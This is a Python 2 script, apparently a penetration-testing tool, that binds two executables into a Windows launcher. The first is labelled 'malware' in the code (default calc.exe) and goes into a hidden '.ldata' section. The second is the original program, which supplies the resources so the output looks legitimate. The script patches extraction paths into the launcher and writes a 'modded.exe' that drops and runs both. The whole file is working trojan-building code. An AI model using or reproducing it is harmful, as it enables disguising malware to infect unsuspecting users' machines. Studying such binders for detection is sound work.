#!/usr/bin/env python

__author__ = 'Leonardo Nve'

from Handlers import PEBinder
import argparse
from tempfile import mkstemp

MALWARE_SECTION_NAME = ".ldata"
ORIGINAL_SECTION_NAME = ".blob"

MAX_PATH = 260
MALPATH_SIGNATURE  = "LDATLDATLDATLDAT"
BLOBPATH_SIGNATURE = "BLOBBLOBBLOBBLOB"


def modpaths(launcher, path, signature = MALPATH_SIGNATURE):
	if len(path)>=60:
		print "ERROR: PATH too long"
		return launcher
		
	with open(launcher,"r") as f:
		data = f.read()
		position = data.find(signature)
		print "SIGNATURE position: %d (0x%x)"%(position, position)
		print "PATH length       : ",str(len(path))
		
		data = data[:position] + path + "\x00"*(MAX_PATH-len(path)) + data[position+MAX_PATH:]
		fd, temp = mkstemp()
		open(temp,"w").write(data)
		return temp
		
	print "ERROR: Path not changed"
	return launcher
		

def add_programs(launcher, program1, original, output):
    
    if program1 is not None:
        pe = PEBinder.PEHandler(launcher)

        try:
            data = open(program1,"rb").read()
        except Exception, e:
            print "%s\n%s" % (Exception, e)
            data = ''

        new, cl, padding = pe.Bind(data,len(data), contentlength = len(data), change_rsrc = False, section_name = MALWARE_SECTION_NAME)
        padata = pe.Padding()

        with open(output,"wb") as f:
            f.write(new)
            if padata is not None:
                f.write(padata)
        launcher = output

    if original is not None:
        pe = PEBinder.PEHandler(launcher)

        try:
            data = open(original,"rb").read()
        except Exception, e:
            print "%s\n%s" % (Exception, e)
            data = ''

        new, cl, padding = pe.Bind(data,len(data), contentlength = len(data), change_rsrc = True, section_name = ORIGINAL_SECTION_NAME)
        padata = pe.Padding()

        with open(output,"wb") as f:
            f.write(new)
            if padata is not None:
                f.write(padata)


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument("-m", "--program1", help="First program to extract & execute (default = calc.exe)", default = "calc.exe")
    parser.add_argument("-r", "--original", help="Second program to extract & execute ", default=None)
    parser.add_argument("-p", "--path1"   , help="Path to extract the program1 (malware)", default=None)
    parser.add_argument("-s", "--path2"	  , help="Path to extract the original", default=None)
    parser.add_argument("-l", "--launcher"  , help="Launcher (default = Launcher.exe)", default = "Launcher.exe" )
    parser.add_argument("-o", "--output"  , help="Output file (default = modded.exe)", default = "modded.exe" )
    args = parser.parse_args()

    program1 = args.program1
    original = args.original
    output	 = args.output
    path1 	 = args.path1
    path2 	 = args.path2
    launcher = args.launcher

    if path1 is not None:
    	launcher = modpaths(launcher, path1, signature = MALPATH_SIGNATURE)
    	
    if path2 is not None:
    	launcher = modpaths(launcher, path2, signature = BLOBPATH_SIGNATURE)
    	
    add_programs(launcher, program1, original, output)
    	

